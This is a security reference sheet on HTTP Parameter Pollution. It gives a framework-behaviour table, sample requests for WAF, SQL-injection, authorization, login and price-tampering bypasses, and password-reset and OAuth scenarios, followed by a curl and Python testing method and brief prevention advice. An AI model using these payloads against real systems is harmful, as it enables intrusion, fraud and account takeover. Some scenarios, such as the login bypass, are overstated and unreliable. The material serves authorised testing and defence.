# HTTP Parameter Pollution (HPP)

## Description
HTTP Parameter Pollution (HPP) is a web attack technique that exploits how web applications handle duplicate parameters. Since there's no standardized method for handling multiple parameters with the same name, different technologies behave differently, leading to potential security bypasses.

## How Different Technologies Handle Duplicate Parameters

| Technology/Framework | Behavior | Example: `a=1&a=2` |
|---------------------|----------|-------------------|
| ASP.NET | All occurrences (comma-separated) | `a = "1,2"` |
| ASP.NET Core | Last occurrence | `a = "2"` |
| PHP | Last occurrence | `$_GET['a'] = "2"` |
| Python Flask | First occurrence | `request.args['a'] = "1"` |
| Python Django | Last occurrence | `request.GET['a'] = "2"` |
| Ruby on Rails | Last occurrence | `params[:a] = "2"` |
| Node.js Express | First occurrence | `req.query.a = "1"` |
| Java Servlet | First occurrence | `request.getParameter("a") = "1"` |
| Golang (net/http) | First occurrence | `r.URL.Query().Get("a") = "1"` |
| Perl CGI | First occurrence | `param('a') = "1"` |
| Python Zope | All (as array) | `a = ["1", "2"]` |
| Node.js (qs) | All (as array) | `a = ["1", "2"]` |

## Client-Side HPP

Exploiting how browsers or client-side JavaScript handles duplicate parameters.

### URL Manipulation
```
# Original URL
https://target.com/search?query=test

# HPP injection
https://target.com/search?query=test&query=<script>alert(1)</script>
```

### Social Share Hijacking
```
# Original share URL
https://target.com/share?url=https://target.com/page

# HPP to change shared URL
https://target.com/share?url=https://target.com/page&url=https://attacker.com
```

## Server-Side HPP

### 1. Authentication Bypass

```http
# Original request
POST /login HTTP/1.1

username=admin&password=wrong

# HPP injection - backend uses last value
POST /login HTTP/1.1

username=admin&password=wrong&password=admin123
```

### 2. WAF Bypass

```http
# Blocked by WAF
GET /search?q=<script>alert(1)</script>

# HPP bypass - WAF checks first, app uses last
GET /search?q=safe&q=<script>alert(1)</script>
```

### 3. Authorization Bypass

```http
# Normal request
GET /api/user?id=123

# HPP to access another user's data
GET /api/user?id=123&id=456
```

### 4. Price Manipulation

```http
# Original checkout
POST /checkout HTTP/1.1

item=1&price=100

# HPP to change price
POST /checkout HTTP/1.1

item=1&price=100&price=1
```

## Array Parameter Injection

### PHP Array Syntax
```
# Normal parameter
user=admin

# Array injection
user[]=admin&user[]=attacker

# Associative array
user[name]=admin&user[role]=administrator
```

### Bracket Notation
```
# Express.js array
items[0]=1&items[1]=2

# Nested objects
user[profile][name]=admin&user[profile][role]=admin
```

## HPP in Different Contexts

### 1. URL Query Parameters
```
https://target.com/page?param=value1&param=value2
```

### 2. POST Body Parameters
```http
POST /api HTTP/1.1
Content-Type: application/x-www-form-urlencoded

param=value1&param=value2
```

### 3. Cookie Values
```http
Cookie: session=abc123; session=xyz789
```

### 4. HTTP Headers
```http
X-Custom-Header: value1
X-Custom-Header: value2
```

## Bypass Techniques

### Encoding Variations
```
# URL encoded ampersand
param=value1%26param=value2

# HTML entity
param=value1&amp;param=value2

# Double encoding
param=value1%2526param%253Dvalue2
```

### Different Delimiters
```
# Semicolon (works in some implementations)
param=value1;param=value2

# Newline injection
param=value1%0a%0dparam=value2
```

### Mixed Methods
```http
# GET and POST with same parameter
GET /page?id=1 HTTP/1.1

POST data: id=2

# Different frameworks may prioritize differently
```

## Real-World Attack Scenarios

### Scenario 1: OAuth Token Theft
```
# Normal OAuth callback
https://target.com/callback?code=LEGIT_CODE

# HPP to inject attacker's code
https://target.com/callback?code=LEGIT_CODE&code=ATTACKER_CODE
```

### Scenario 2: Password Reset Poisoning
```http
POST /reset-password HTTP/1.1

email=victim@example.com&email=attacker@example.com

# Email might be sent to attacker's address
```

### Scenario 3: SQL Injection Bypass
```
# Blocked
GET /search?q=1' OR '1'='1

# HPP bypass (first param checked, second used)
GET /search?q=safe&q=1' OR '1'='1
```

### Scenario 4: API Abuse
```http
# Rate limiting on user parameter
GET /api/data?user=user1&limit=10

# HPP to access as different user
GET /api/data?user=user1&user=admin&limit=10
```

## Testing Methodology

### 1. Identify Parameters
```bash
# Map all parameters in requests
# Note which ones affect application logic
```

### 2. Test Duplicate Parameters
```bash
# Add duplicate parameters and observe behavior
curl "https://target.com/page?id=1&id=2"
```

### 3. Test Array Syntax
```bash
# Try array notation
curl "https://target.com/page?id[]=1&id[]=2"
curl "https://target.com/page?id[0]=1&id[1]=2"
```

### 4. Test Different Encodings
```bash
# URL encoded
curl "https://target.com/page?id=1%26id=2"
```

### 5. Compare Front-end vs Back-end
```bash
# Check if validation and processing use same value
```

## Tools

### Burp Suite
```
1. Capture request
2. Send to Repeater
3. Manually add duplicate parameters
4. Compare responses
```

### Custom Script
```python
import requests

url = "https://target.com/page"
params = [('id', '1'), ('id', '2')]
response = requests.get(url, params=params)
print(response.text)
```

## Prevention

```
1. Use consistent parameter handling across application
2. Validate parameters at all layers
3. Use allowlist for expected parameters
4. Implement strict input validation
5. Don't rely solely on client-side validation
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution
